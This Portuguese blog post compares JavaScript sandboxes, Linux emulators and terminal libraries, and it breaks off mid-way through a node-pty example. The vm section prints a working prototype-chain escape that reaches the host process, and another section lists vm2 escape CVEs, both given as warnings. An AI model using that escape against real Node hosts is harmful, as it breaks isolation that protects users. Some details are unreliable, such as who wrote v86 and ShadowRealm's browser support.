---
title: Comparação das soluções JavaScript para simulação de kernels Linux
description: Uma análise aprofundada das reconstituições de ambientes Linux
  em JavaScript/TypeScript.
date: 2026-05-28
tags:
  - javascript
  - linux
  - analysis
authors:
  - fox3000foxy
author_pubkey: "MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEoFS9I15CAZojXYc6NMqggEYGct9o9b3JnWdXWOtlzgs2lclmqw8adtWgXUeeBMRHvm5LoajQ+OcImaAyA8jwYA=="
author_sig: "xdtVLXxwqfG5k2FBaTqBiUsR/iFVDO7jXxTWAgVapbUu4/jG0OzyKEaJN6Lzzo6Ni9dD2Jrmj3l0zoMN2uVLqw=="
---

# Cada sandbox JavaScript, emulador, simulador e honeypot Linux, comparado

Bom, já faz um tempo que estou fundo demais nessa toca de coelho. Tudo começou porque eu estava ajudando em [typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container) -- um projeto da Fortune (falo dela daqui a pouco) -- e me perguntavam toda hora "pera, qual a diferença para o `v86` ?" ou "por que não usar `vm2` ?" -- e percebi que não conseguia dar uma resposta clara sem mapear o ecossistema inteiro primeiro. Então é isso, suponho.

Acontece que há quatro famílias distintas -- os sandboxes JS, os emuladores Linux, os simuladores Linux, e os honeypots -- e elas quase nunca se sobrepõem, mesmo sendo mencionadas o tempo todo na mesma frase. Quem constrói um sistema de plugins usa `isolated-vm`. Quem faz uma demo de ferramenta CLI usa `v86`. Quem faz inteligência de ameaças em SSH usa Cowrie. Resolvem problemas completamente diferentes sob o mesmo guarda-chuva vago de "rodar código numa caixa."

Passei bastante tempo lendo código-fonte, relatórios CVE, docs de arquitetura e páginas npm para escrever este artigo. Vai ser longo -- pega um café, sério. Ou dois.

> Pequeno disclaimer : `typescript-virtual-container` aparece em destaque neste artigo porque foi o que disparou esta pesquisa. Tentei ser justo com todo o resto, mas leva esse contexto em conta.

---

## Parte 0 -- Primeiro, qual problema você está realmente resolvendo ?

Antes de mergulhar, vale ser preciso sobre para que serve cada família, porque a terminologia vira bagunça rápido e as pessoas misturam tudo o tempo todo (eu inclusive, antes de sentar e mapear tudo direito).

**Os sandboxes JS** isolam código JavaScript do processo Node.js hospedeiro. O modelo de ameaça é : código JS não confiável que poderia chamar `process.exit()`, ler arquivos, ou lançar processos filhos. A solução é uma fronteira em torno da execução V8. Essas ferramentas não têm noção de shell Linux, sistema de arquivos com permissões, ou SSH.

**Os emuladores Linux** rodam um kernel Linux real não modificado em um emulador de CPU (x86, RISC-V, OR1K) implementado em JavaScript ou WebAssembly. Você inicializa um OS de verdade. Tem syscalls de verdade. Tem compatibilidade binária com programas compilados para x86. O custo de recursos é enorme.

**Os simuladores Linux** imitam o *comportamento* de um sistema Linux sem rodar um kernel de verdade. Implementam um interpretador de shell, um sistema de arquivos virtual, e semântica Unix suficiente para enganar programas e humanos. Sem kernel, sem Wasm, sem emulação de CPU. Bem menos recursos.

**Os honeypots** são feitos para atrair atacantes e registrar o que fazem. Não são principalmente ambientes de execução -- são ferramentas de observabilidade. A fidelidade ao comportamento real do Linux só importa na medida em que impede o atacante de detectar a armadilha.

Com esse quadro, eis onde cada projeto deste artigo se encaixa :

```
JS sandbox :       vm, vm2, isolated-vm, quickjs-emscripten, Deno Workers, ShadowRealm
Emulador Linux :   v86, JSLinux/TinyEMU, jor1k, CheerpX, WebContainers, container2wasm
Simulador Linux :  typescript-virtual-container (único nesse espaço)
Honeypot :         Cowrie, Kippo, Lyrebird, endlessh, sshesame, node-simple-ssh-honeypot
Stack terminal :   xterm.js + node-pty (não é isolador, mas relacionado)
```

---

## Parte 1 -- Os sandboxes JavaScript

### 1.1 `vm` -- o módulo nativo do Node.js (não é o que você pensa)

A resposta mais antiga para "executar JS não confiável" no Node é o módulo nativo `vm`. Existe desde a v0.1, então muita gente usa primeiro -- e se queima.

```js
const vm = require("vm");
const sandbox = { answer: 0 };
vm.createContext(sandbox);
vm.runInContext("answer = 6 * 7", sandbox);
console.log(sandbox.answer); // 42
```

O que `vm` realmente faz : cria um novo contexto V8 (um novo conjunto de construtores nativos -- `Object`, `Array`, `Function`, etc.) e executa código nele, com uma referência compartilhada para o que você põe em `sandbox`. Seu motor V8 não muda. Seu processo não muda. A memória é compartilhada.

A razão pela qual `vm` não oferece segurança nenhuma : a cadeia de protótipos do JavaScript é um DAG que conecta tudo a `Object.prototype`. Se você põe um objeto do mundo hospedeiro no sandbox, o hóspede pode subir sua cadeia de protótipos e alcançar os construtores hospedeiros. A partir de `Function`, dá para chamar `Function("return process")()` e pegar o `process` de verdade. Fim de jogo. Tipo, na hora.

```js
// Funciona perfeitamente em vm -- você pega o process de verdade
vm.runInNewContext(`({}).__proto__.constructor("return process")()`);
```

Quer dizer, a própria documentação do Node.js diz : "O módulo vm não é um mecanismo de segurança. Não use para executar código não confiável." Esse aviso está lá desde sempre. As pessoas ignoram sem parar. Já vi aplicações em produção usando `vm` como sandbox. Por favor, não faça isso.

**Veredito** : um mecanismo de escopo, não um sandbox. Use quando precisar isolar variáveis (motores de template, recursos tipo `eval` onde você controla o código). Nunca para entradas não confiáveis.

**Memória** : sobrecarga desprezível -- mesmo heap V8 do processo hospedeiro.
**Segurança** : nenhuma contra um atacante motivado.

---

### 1.2 `vm2` -- a tentativa da comunidade, e sua morte bem longa

`vm2` era a resposta da comunidade ao problema de fuga do `vm`. A ideia central : embrulhar cada objeto que cruza a fronteira do sandbox em um `Proxy` que intercepta acessos a propriedades, bloqueia a subida de protótipos, e filtra referências perigosas. Ideia inteligente em teoria ! Na prática, o resultado se revelou bem menos convincente, como vamos ver.

```js
const { VM } = require("vm2");
const vm = new VM({ timeout: 1000, sandbox: {} });
vm.run("process.exit(1)"); // lança VMError, process inacessível
```

Por vários anos, funcionou bem até. Mas a superfície de ataque dos `Proxy` JavaScript é enorme. Cada recurso novo da linguagem JS -- geradores, iteradores assíncronos, `Symbol.toPrimitive`, `Error.prepareStackTrace`, os slots internos de `Promise` -- é um vetor potencial de bypass.

A cronologia de CVEs é... algo. Tipo, olha isso :

| Data | CVE | Mecanismo |
|------|-----|-----------|
| Out 2022 | CVE-2022-36067 | Fuga do contexto hospedeiro via `Error.prepareStackTrace` |
| Abr 2023 | CVE-2023-29017 | Vazamento de objeto hospedeiro via erro async não tratado |
| Abr 2023 | CVE-2023-29199 | Bypass da sanitização de exceções via `handleException()` |
| Abr 2023 | CVE-2023-30547 | `Proxy.getPrototypeOf` → `Function` → RCE |
| Mai 2023 | CVE-2023-32314 | `Proxy` em `Error.name` → `Function` → RCE |
| Jul 2023 | CVE-2023-37466 | Função async + estouro de pilha + `Proxy.getPrototypeOf` |
| Jul 2023 | CVE-2023-37903 | Worker thread + fuga por eval |

Três CVEs críticas no mesmo mês (abril de 2023). TRÊS. EM UM MÊS. Depois da CVE-2023-37903, o mantenedor depreciou oficialmente a biblioteca com a mensagem : *"A biblioteca contém problemas críticos de segurança e não deveria ser usada em produção."*

O mantenedor a ressuscitou em outubro de 2025 com a versão 3.10.0, dizendo ter corrigido tudo que era conhecido na época. Uma nova fuga crítica (CVE-2026-22709, CVSS 9.8) foi divulgada em janeiro de 2026, seguida de um lote de outras onze em maio de 2026. Onze. O padrão não mudou e sinceramente acho que nunca vai mudar.

O problema fundamental é arquitetural -- e é a lição que o ecossistema inteiro demorou para aprender. Não dá para construir um sandbox seguro usando a mesma linguagem que você isola, no mesmo motor, no mesmo processo. A superfície de fuga é a implementação inteira do V8 -- e o V8 tem vários milhões de linhas de C++ que mudam sem parar. Cada recurso novo do JS potencialmente abre uma nova via de ataque.

**Veredito** : Não usar para aplicações sensíveis a segurança. Mesmo na última versão, novos bypasses são descobertos a cada poucos meses. O próprio mantenedor reconheceu abertamente.

---

### 1.3 `isolated-vm` -- o que realmente funciona

`isolated-vm` adota a abordagem certa : usar a primitiva de isolamento nativa do V8, o Isolate. Cada Isolate V8 tem seu próprio heap, seu próprio coletor de lixo, seu próprio conjunto de nativos, e zero referência compartilhada com os outros Isolates.

É a mesma fronteira que o Chrome usa entre abas. É uma barreira real de segurança, não um truque de linguagem construído sobre Proxy.

```js
import ivm from "isolated-vm";

// Cada isolate é seu próprio heap V8
const isolate = new ivm.Isolate({ memoryLimit: 64 }); // limite em MB
const context = await isolate.createContext();
const jail = context.global;

// Passar dados pela fronteira exige serialização explícita
await jail.set("sensitiveData", "not this");
await jail.set("log", new ivm.Reference(console.log));

const script = await isolate.compileScript(`
  // Não alcança o processo hospedeiro, o heap hospedeiro ou os módulos hospedeiros
  log.applySync(undefined, ["hello from the isolate"]);
`);
await script.run(context);

// Dá para encerrar na marra em timeout ou limite de memória
isolate.dispose(); // libera o heap inteiro
```

Os tipos `Reference` e `ExternalCopy` são a ponte explícita de comunicação. Uma `Reference` dá ao isolate um handle chamável para uma função hospedeira -- o isolate pode chamá-la mas não pode inspecionar seu closure ou protótipo. Um `ExternalCopy` serializa um valor (clone estruturado) através da fronteira do heap. Esse modelo de ponte explícita não é prático, mas é o que torna o isolamento real.

Dá para definir limites rígidos de recursos : memória (o isolate é encerrado se passar do limite), timeout de relógio, e timeout de CPU. O encerramento é real -- mata o Isolate V8 inteiro, não só um timeout JS que dá para contornar com `while(true)`.

**Limites** : é só JS. Não dá para rodar bash dentro. Não há noção de arquivos, permissões, rede ou processos. É exatamente a ferramenta certa para JS enviado por usuário (plugins, fórmulas, hooks de script), e a ferramenta errada para todo o resto. A autora de `typescript-virtual-container` mencionou que chegou a considerar no início antes de perceber que "executar comandos shell" e "isolar JavaScript" são problemas fundamentalmente diferentes.

**Memória** : ~3-10 MB por isolate vazio, cresce com o uso do heap.
**Segurança** : sólida. A fronteira V8 Isolate é a primitiva real de isolamento.
**npm** : [isolated-vm](https://www.npmjs.com/package/isolated-vm)
**GitHub** : [laverdet/isolated-vm](https://github.com/laverdet/isolated-vm)

---

### 1.4 `quickjs-emscripten` -- um motor JS separado compilado em Wasm

Uma abordagem diferente : em vez de isolar dentro do V8, rodar um motor JavaScript completamente separado compilado em WebAssembly. O hospedeiro roda em V8/Node. O hóspede roda em QuickJS-em-Wasm. O sandbox Wasm fornece a fronteira de isolamento.

QuickJS é mais uma obra de Fabrice Bellard (o mesmo cara por trás de QEMU, FFmpeg, JSLinux, TinyEMU -- essa pessoa não é real, sério, como uma pessoa só faz tudo isso ?). É um motor JS pequeno em conformidade com ES2023 escrito em C, e compilado em Wasm tem só uns 500 KB.

```js
import { getQuickJS } from "quickjs-emscripten";

const QuickJS = await getQuickJS();
const vm = QuickJS.newContext();

const result = vm.evalCode(`
  // Roda em QuickJS, completamente separado do V8
  (function() { return 6 * 7; })()
`);

if (result.error) {
  console.log("Error:", vm.dump(result.error));
  result.error.dispose();
} else {
  console.log("Result:", vm.dump(result.value)); // 42
  result.value.dispose();
}

vm.dispose();
```

QuickJS é um motor JavaScript pequeno em conformidade com ES2023 escrito em C. Compilado em Wasm, tem cerca de 500 KB para a variante síncrona, ~1 MB para a variante assíncrona (Asyncify). A gestão de memória é manual -- cada valor que você extrai da VM precisa ser liberado explicitamente, o que é meio chato mas evita surpresas de GC entre fronteiras. Um compromisso divertido !

O wrapper `@sebastianwessel/quickjs` adiciona uma API mais ergonômica por cima, com sistema de arquivos virtual opcional, suporte a fetch, e stubs de módulos Node.js :

```ts
import variant from "@jitl/quickjs-ng-wasmfile-release-sync";
import { loadQuickJs } from "@sebastianwessel/quickjs";

const { runSandboxed } = await loadQuickJs(variant);

const result = await runSandboxed(
  async ({ evalCode }) => evalCode(`
    import { join } from 'path';
    export default join('src', 'dist');
  `),
  { allowFs: false, allowFetch: false }
);
```

O modelo de segurança é diferente de `isolated-vm` : o modelo de memória linear do Wasm faz o hóspede não poder acessar diretamente os objetos do heap V8. A superfície de ataque é a interface hospedeiro↔Wasm (imports/exports), não a linguagem JS inteira. Isso geralmente é considerado mais robusto que sandboxes baseados em Proxy.

O revés : QuickJS não tem o mesmo nível de otimização que o V8. Para cargas JS CPU-bound, é de 5 a 20 vezes mais lento que o V8. Para pedacinhos de código e avaliações não confiáveis, geralmente não importa.

**Memória** : ~500 KB de módulo Wasm + heap por instância.
**Segurança** : fronteira Wasm, considerada mais sólida que abordagens baseadas em Proxy.
**npm** : [quickjs-emscripten](https://www.npmjs.com/package/quickjs-emscripten), [@sebastianwessel/quickjs](https://www.npmjs.com/package/@sebastianwessel/quickjs)
**GitHub** : [justjake/quickjs-emscripten](https://github.com/justjake/quickjs-emscripten)

---

### 1.5 Deno -- um runtime que põe permissões em primeiro lugar

Deno adota uma filosofia completamente diferente : em vez de fazer sandbox dentro do Node, construir um runtime novo que é seguro por padrão. Gosto muito dessa abordagem -- é o que Node.js deveria ter sido desde o início, sinceramente. Ryan Dahl (o criador original do Node.js) literalmente criou o Deno porque se arrependeu de algumas decisões de design do Node.js, o que é bem louco quando se pensa nisso.

Cada capacidade sensível (leitura de arquivo, escrita de arquivo, rede, ambiente, subprocesso) exige uma flag `--allow-*` explícita :

```bash
# Este só pode ler em /data, nada mais
deno run --allow-read=/data script.ts

# Este só pode acessar um único domínio
deno run --allow-net=api.example.com script.ts

# Sem flags = nenhuma permissão
deno run untrusted.ts # não pode ler, escrever, rede, lançar
```

O modelo de permissões é implementado no nível Rust/OS -- não é um truque JS. Quando código Deno chama `Deno.readFile()`, passa por uma operação Rust que verifica a tabela de permissões antes de tocar no sistema de arquivos. Não dá para contornar a partir do JS porque a syscall nunca acontece se a permissão não for concedida.

Para executar código realmente não confiável, os Workers Deno (Web Workers) fornecem um segundo isolate no mesmo processo, cada um com seu próprio conjunto de permissões. Dá para lançar um worker com zero permissão e comunicar com ele via `postMessage`.

Deno 2 (lançado em outubro de 2024) adicionou compatibilidade npm completa e shims de compatibilidade Node.js, o que melhorou bastante sua adoção para casos de uso server-side.

**O compromisso** : o modelo de segurança do Deno é excelente para código em que você poderia confiar parcialmente. Para código completamente não confiável que poderia ser adversarial, o modelo de permissões não ajuda -- você precisa de uma fronteira Isolate (`isolated-vm`) ou de um motor diferente (`quickjs-emscripten`), porque o Deno continua usando V8 e atacantes sofisticados podem achar bugs no nível do V8.

---

### 1.6 TC39 ShadowRealm -- a resposta padronizada (um dia)

O organismo de padronização do JavaScript (TC39) tem uma proposta chamada ShadowRealm que tenta padronizar o que `vm` e `vm2` tentavam fazer, mas com um modelo de segurança correto. Um ShadowRealm cria um contexto de execução JS isolado com seus próprios intrínsecos, nenhum acesso ao reino exterior, e uma interface de import/export cuidadosamente controlada.

```js
const realm = new ShadowRealm();
const result = realm.evaluate(`
  // Intrínsecos separados, sem acesso ao reino exterior
  typeof globalThis.fetch // "undefined"
  6 * 7 // 42
`);
```

ShadowRealm está disponível nos navegadores (Chrome 90+, Firefox 105+) mas ainda não está no Node.js estável em 2026. A proposta TC39 Compartments se apoia nele para isolamento no nível de módulos. Essas são as respostas padronizadas de longo prazo, mas ainda não estão prontas para produção server-side em Node. É um daqueles projetos que você vê chegando de longe mas... simplesmente ainda não chegou. Bem típico do TC39.

---

### Resumo da família dos sandboxes

| | `vm` | `vm2` | `isolated-vm` | `quickjs-emscripten` | Deno Workers |
|---|---|---|---|---|---|
| **Fronteira de isolamento** | nenhuma (escopo) | Proxy (quebrado) | V8 Isolate | Wasm | V8 Isolate + perms Rust |
| **Limite de memória** | ❌ | ❌ | ✅ limite rígido | ✅ heap Wasm | parcial |
| **Timeout CPU** | ❌ | ✅ (contornável) | ✅ rígido | ✅ | ✅ |
| **Segurança** | nenhuma | quebrada | sólida | sólida | sólida |
| **Velocidade JS** | V8 nativo | V8 nativo | V8 nativo | ~10x mais lento | V8 nativo |
| **Navegador** | ❌ | ❌ | ❌ | ✅ | ❌ |
| **Compatibilidade Node** | nativo | ✅ | ✅ | shims parciais | parcial |
| **Status** | estável | arriscado (novas CVE) | ✅ ativo | ✅ ativo | ✅ ativo |
| **Sobrecarga RAM** | ~1 MB | ~5-20 MB | ~3-10 MB | ~5-15 MB | ~10-30 MB |

O veredito : se segurança importa para você, há exatamente duas opções reais -- `isolated-vm` (extensão nativa, V8 Isolate, velocidade JS total) e `quickjs-emscripten` (Wasm, compatível com navegador, ~10x mais lento para computação intensiva). Todo o resto é "por favor não faça isso" (`vm`, `vm2`) ou um runtime que resolve um problema completamente diferente (Deno). ShadowRealm poderia mudar o jogo um dia, mas ainda não é o caso.

---

---

## Parte 2 -- Os emuladores Linux em JavaScript

É aqui que as coisas ficam realmente interessantes para mim. São emuladores *de verdade* -- implementam um conjunto de instruções de CPU em JavaScript ou WebAssembly, inicializam uma imagem real de kernel Linux, e executam binários reais de usuário. O isolamento vem do fato de hóspede e hospedeiro não compartilharem nada : espaços de memória diferentes, fluxos de instruções diferentes.

O preço a pagar é enorme, mas o que você ganha é realmente notável : Linux de verdade, rodando de verdade, no seu navegador ou no seu processo Node. Tipo, é bem louco quando se pensa nisso, né ?

### 2.1 `v86` -- emulador PC x86 em JS + JIT Wasm

`v86` de Fabrice (copy no GitHub) é o emulador x86 open source mais capaz em JavaScript. Começou como um interpretador JS puro por volta de 2013 e evoluiu para um sistema JIT onde blocos básicos x86 são traduzidos para WebAssembly na hora, melhorando bastante o desempenho.

O que ele emula :
- **CPU** : x86-32 (IA-32), conjunto de instruções mais ou menos nível Pentium 1. O 64-bit (x86-64) continua excluído -- é um limite arquitetural de hardware, não um recurso faltante.
- **FPU** : via `Float64Array` do JavaScript. O x87 é precisão estendida 80-bit ; os doubles JS são 64-bit. Isso significa que resultados de ponto flutuante podem diferir um pouco de uma CPU de verdade.
- **Memória** : configurável, mapeia para um `SharedArrayBuffer` ou `ArrayBuffer` no heap JS.
- **Hardware** : 8254 PIT (timer), 8259 PIC (controlador de interrupções), controlador de teclado 8042 (PS/2), CMOS RTC, VGA com extensões SVGA e Bochs VBE, controlador IDE, controlador de disquete (8272A), placa de rede NE2000.
- **BIOS** : usa SeaBIOS (BIOS x86 open source).

O JIT funciona identificando blocos básicos (sequências de instruções x86 sem saltos), traduzindo-os para uma função WebAssembly, guardando essa função em cache, e chamando-a nas execuções seguintes do mesmo bloco. Caminhos quentes de código ganham desempenho Wasm nativo. Caminhos frios caem de volta no interpretador JS.

```js
import { V86 } from "v86";
import { readFileSync } from "fs";

const emulator = new V86({
  bios:    { buffer: readFileSync("./bios/seabios.bin") },
  vga_bios:{ buffer: readFileSync("./bios/vgabios.bin") },
  hda:     { buffer: readFileSync("./images/alpine.img"), async: false },
  memory_size: 128 * 1024 * 1024, // 128 MB
  autostart: true,
});

// Capturar a saída serial (console do kernel Linux)
emulator.add_listener("serial0-output-byte", byte => {
  process.stdout.write(String.fromCharCode(byte));
});

// Enviar entrada ao hóspede (digitar no shell)
emulator.serial0_send("ls /\n");
```

**OS suportados** : Alpine Linux (excelente), Ubuntu 16.04/18.04 (só i386), Arch Linux 32, ReactOS, FreeDOS, Windows 9x/2000 (com ressalvas), MS-DOS.

**Tempo de boot** : 15-40 segundos para Alpine Linux a partir de uma imagem limpa. É inerente à inicialização real do kernel -- não dá para pular. Sim, seus usuários vão ver um kernel Linux bootando no navegador. É o acordo.

**Memória mínima** : 100-256 MB por instância. Só o cache de código Wasm JIT pode chegar a dezenas de MB para uma instância Linux ocupada.

**Uso em Node.js** : totalmente suportado. O DOM continua supérfluo -- a saída VGA pode ser ignorada se você só se interessa pela saída serial.

**O que você não consegue fazer** : rodar binários 64-bit, usar recursos modernos do kernel (eBPF, io_uring, etc.), ou rodar mais que um punhado de instâncias simultâneas sem bater nos limites de memória.

**npm** : [v86](https://www.npmjs.com/package/v86) -- atualizado continuamente, última publicação no próprio dia enquanto escrevo.
**GitHub** : [copy/v86](https://github.com/copy/v86)
**Demo** : [copy.sh/v86](https://copy.sh/v86)

---

### 2.2 JSLinux e TinyEMU -- o trabalho do Bellard, em duas vezes

JSLinux é o próprio emulador Linux em JavaScript de Fabrice Bellard -- o primeiríssimo, publicado em 2011. Continuo mencionando Bellard neste artigo porque ele não para de reaparecer : QuickJS, TinyEMU, JSLinux, QEMU, FFmpeg. Esse cara é outra coisa. Realmente uma das contribuições técnicas individuais mais impressionantes da história do software, sem exagero.

O JSLinux original era um interpretador x86 JS puro. Em 2016, Bellard escreveu o TinyEMU (um emulador RISC-V em C), compilou para JavaScript via Emscripten, e isso virou a base do JSLinux atual. Então o JSLinux atual é na verdade código C que gera JavaScript -- não JS escrito à mão de jeito nenhum.

As notas técnicas no site do Bellard valem a leitura : o JSLinux atual roda uma CPU RISC-V 32 ou 64-bit (não x86), emulando um console VirtIO, rede VirtIO, dispositivo de bloco VirtIO, e um sistema de arquivos 9P para compartilhamento de arquivos com o hospedeiro. A demo JS é compilada a partir de C usando Emscripten -- não é JS escrito à mão.

O próprio TinyEMU suporta :
- RISC-V RV32IMAFDQC e RV64IMAFDQC (32 e 64-bit, com ponto flutuante, multiplicação, instruções comprimidas)
- x86 via KVM (só nativo, sem emulação -- então a versão JS é só RISC-V)
- Console VirtIO, rede, bloco, entrada, sistema de arquivos 9P

TinyEMU tem uma demo JavaScript fornecida via Emscripten. É a base do JSLinux e também é usado por `container2wasm` (ver seção 2.5).

**Status JSLinux** : sem package npm, sem API programável. É uma demo que você abre no navegador. A importância histórica é grande -- provou o conceito. A utilidade prática como biblioteca : nula.

**TinyEMU** : fora do npm, fonte C disponível em [bellard.org/tinyemu](https://bellard.org/tinyemu/).

---

### 2.3 jor1k -- emulador OR1K

jor1k é um emulador OpenRISC 1000 (OR1K) escrito em JavaScript por Sebastian Macke. É interessante historicamente porque o jor1k introduziu o suporte ao sistema de arquivos VirtIO 9P, que Bellard depois integrou ao TinyEMU e ao JSLinux. A polinização cruzada entre esses projetos é intensa -- todos pegam ideias uns dos outros emprestadas, o que é sinceramente uma das coisas mais legais do trabalho de emulação open source.

**Status** : sem manutenção ativa, sem package npm. Arquivado a esta altura. Útil de conhecer sobretudo pelo contexto histórico -- tipo se alguém mencionar jor1k numa conversa, agora você sabe o que é :)

---

### 2.4 CheerpX -- emulador x86 comercial para o navegador

CheerpX da Leaning Technologies é o emulador Linux x86 comercial de qualidade produção. Não é open source, mas é bem mais capaz que o v86 para rodar um userspace Debian/Ubuntu de verdade. Se você precisa de um VSCode de verdade no navegador, é disso que precisa.

Diferenças principais em relação ao v86 :
- Suporta um ISA mais amplo (mais extensões x86, melhor compatibilidade glibc)
- Sistema de arquivos baseado em IndexedDB no navegador (persistente entre recarregamentos de página)
- Suporte a pthread via `SharedArrayBuffer` (que exige os cabeçalhos COOP/COEP -- sim esses cabeçalhos chatos de segurança)
- Feito para rodar VSCode, Python, Node.js, e outras aplicações reais -- não só imagens OS mínimas
- Suporte profissional e SLA disponível (ou seja dá para reclamar com alguém se quebrar)

O caso de uso típico é "rodar uma aplicação Linux de verdade no navegador sem servidor." Empresas usam para IDEs baseadas em navegador, tutoriais de código, e documentação interativa.

```js
// API CheerpX (simplificada) : cria Linux e roda bash
const cx = await CheerpX.Linux.create({
  mounts: [{ type: "ext2", path: "/", dev: CloudDevice.create(...) }],
});
await cx.run("/bin/bash");
```

**História com Node.js** : CheerpX é feito primeiro para o navegador. O emulador por baixo teoricamente poderia funcionar em Node (é Wasm), mas a API e a documentação são totalmente voltadas para uso em navegador. Uso server-side não suportado.

**Memória** : parecida com v86 -- 200+ MB para uma instância Debian de verdade.
**Preço** : grátis para projetos open source, licença comercial para SaaS em produção.
**Docs** : [cheerpx.io/docs/overview](https://cheerpx.io/docs/overview)

---

### 2.5 WebContainers (StackBlitz) -- Node.js em Wasm, não emulação Linux

WebContainers costumam cair no mesmo saco que emuladores Linux mas são arquiteturalmente diferentes. Não emulam x86. Não bootam Linux. Rodam Node.js compilado em WebAssembly usando WASI. Essa distinção importa muito e passei tempo demais confuso com isso.

Acho que a confusão vem do marketing -- "rodar Node.js no seu navegador" parece emulação, mas na verdade é o próprio Node.js compilado em Wasm, não uma emulação Linux rodando Node.js numa VM. Duas arquiteturas completamente diferentes.

A arquitetura :
1. Node.js é compilado em Wasm (um runtime WASI customizado especificamente)
2. Um Service Worker intercepta as requisições de rede do servidor Node.js emulado e roteia para a aba do navegador
3. O sistema de arquivos vive na memória do navegador (sem E/S de disco)
4. npm é uma implementação customizada otimizada para uso no navegador

```js
import { WebContainer } from "@webcontainer/api";

const webcontainer = await WebContainer.boot();

// Escrever arquivos
await webcontainer.mount({
  "index.js": { file: { contents: `console.log("hello")` } },
  "package.json": { file: { contents: `{"name":"demo","type":"module"}` } }
});

// Executar comandos Node.js
const proc = await webcontainer.spawn("node", ["index.js"]);
proc.output.pipeTo(new WritableStream({ write: chunk => console.log(chunk) }));
```

Como roda Node.js de verdade (compilado em Wasm), você tem npm de verdade, APIs Node.js de verdade, e resolução real de módulos. Você não tem um userspace Linux genérico -- não dá para instalar pacotes de sistema com `apt`, rodar binários compilados arbitrários, ou fazer muita coisa fora do ecossistema Node.js.

**Pré-requisitos de navegador** : SharedArrayBuffer (exige cabeçalhos COOP/COEP), suporte a Service Worker, Wasm moderno.

**História com Node.js** : feito exclusivamente para uso em navegador. A API não funciona fora de um contexto de navegador.

**npm** : [@webcontainer/api](https://www.npmjs.com/package/@webcontainer/api)
**Docs** : [webcontainers.io](https://webcontainers.io)

---

### 2.6 container2wasm -- contêineres Docker compilados em Wasm

`container2wasm` é uma ferramenta (não um package npm) da NTT que pega uma imagem de contêiner Docker e converte em um binário WebAssembly que pode rodar em qualquer hospedeiro Wasm -- incluindo um navegador. Quando vi isso pela primeira vez, realmente não acreditei que funcionava.

O mecanismo :
- Para contêineres x86_64 : embute Bochs (um emulador x86, compilado em Wasm) + o sistema de arquivos raiz do contêiner
- Para contêineres riscv64 : embute TinyEMU (Bellard de novo !) + o sistema de arquivos raiz do contêiner
- O `.wasm` resultante boota o emulador, monta o sistema de arquivos do contêiner, e executa o entrypoint do contêiner

```bash
# Converter um contêiner Ubuntu 22.04 em Wasm
c2w ubuntu:22.04 out.wasm

# Executá-lo
wasmtime out.wasm uname -a
# Linux 5.15.0 #1 SMP riscv64 GNU/Linux

# Ou servir para uso em navegador
c2w --to-js ubuntu:22.04 /tmp/htdocs/
```

O `.wasm` resultante é volumoso -- um Ubuntu mínimo tem várias centenas de MB -- mas é completamente autônomo. Dá para mandar um `.wasm` por email para alguém e a pessoa pode rodar Ubuntu no navegador. Essa frase não deveria fazer sentido mas chegamos lá.

**GitHub** : [container2wasm/container2wasm](https://github.com/container2wasm/container2wasm)

---

### Resumo da família dos emuladores

| | `v86` | JSLinux/TinyEMU | jor1k | CheerpX | WebContainers | container2wasm |
|---|---|---|---|---|---|---|
| **Arquitetura** | x86-32 JIT→Wasm | RISC-V (Wasm) | OR1K (JS) | x86 (proprietário) | Node.js→Wasm/WASI | x86/RISC-V (Wasm) |
| **Kernel de verdade** | ✅ | ✅ | ✅ | ✅ | ❌ (Node.js) | ✅ |
| **64-bit** | ❌ | ✅ (RISC-V) | ❌ | ✅ | n/a | ✅ |
| **Package npm** | ✅ | ❌ | ❌ | CDN/API | ✅ | ❌ (tool CLI) |
| **Uso Node.js** | ✅ | ❌ | ❌ | ❌ | ❌ (só navegador) | via Wasmtime |
| **Uso navegador** | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
| **RAM/instância** | 150-256 MB | ~64-128 MB | ~64 MB | 200+ MB | ~100 MB | ~200-500 MB |
| **Tempo de boot** | 15-40s | 10-30s | 10-30s | 15-40s | 2-5s | 10-40s |
| **Open source** | ✅ | ✅ | ✅ | ❌ | parcial | ✅ |
| **Status** | ✅ bem ativo | ✅ estável | ⚠️ arquivado | ✅ comercial | ✅ ativo | ✅ ativo |

O que salta aos olhos nessa tabela : `v86` é o único que é um package npm, que roda tanto no navegador quanto em Node, e que é open source. Por isso domina a conversa sobre "emuladores Linux em JavaScript". Todo o resto tem um porém -- JSLinux não tem API, jor1k está arquivado, CheerpX custa dinheiro, WebContainers é só-navegador e específico de Node, container2wasm exige uma etapa de build e um CLI. Se você só precisa de "bootar Linux em JavaScript", `v86` é quase sempre o ponto de partida certo.

---

## Parte 3 -- As stacks de terminal : xterm.js e node-pty

Dois packages voltam sem parar quando as pessoas constroem experiências tipo shell. Não são sandboxes nem emuladores -- são o encanamento de UI e PTY -- mas são tão relacionados que eu me sentiria mal deixando de fora. Além disso, usei os dois e são realmente bons.

### 3.1 `xterm.js` -- a renderização de terminal

xterm.js é um emulador de terminal para o navegador. Mostra uma tela de terminal (sequências de escape VT100/xterm) em um elemento `<canvas>`, lida com entradas de teclado, e expõe uma API para rotear os dados.

Usado por : o terminal integrado do VS Code, Azure Cloud Shell, Proxmox VE, AWS CloudShell, e muitos outros.

```js
import { Terminal } from "@xterm/xterm";
import { FitAddon } from "@xterm/addon-fit";

const term = new Terminal({ cursorBlink: true });
const fitAddon = new FitAddon();
term.loadAddon(fitAddon);
term.open(document.getElementById("terminal"));
fitAddon.fit();

// Enviar dados ao terminal (mostrado como texto)
term.write("$ ");
term.onData(data => {
  // data são as teclas -- manda ao seu backend
  socket.send(data);
});
socket.onmessage(msg => {
  // saída do backend -- mostra
  term.write(msg.data);
});
```

xterm.js é só a camada de renderização. Não executa shell. Não interpreta comandos. É um widget de exibição que você conecta ao backend da sua escolha. Muita gente pensa que xterm.js "faz o terminal" mas é realmente só a tela -- você ainda precisa conectar a algo que executa comandos de verdade.

**npm** : [@xterm/xterm](https://www.npmjs.com/package/@xterm/xterm)
**GitHub** : [xtermjs/xterm.js](https://github.com/xtermjs/xterm.js)

---

### 3.2 `node-pty` -- criação de PTY

`node-pty` cria um pseudoterminal (PTY) em Node.js e te dá um handle de leitura/escrita nele. Usado com xterm.js, permite construir um terminal de navegador que fala com um shell de verdade (bash, zsh, fish) rodando no servidor.

```js
import * as pty from "node-pty";

const shell = pty.spawn("bash", [], {
  name: "xterm-color",
  cols: 80,
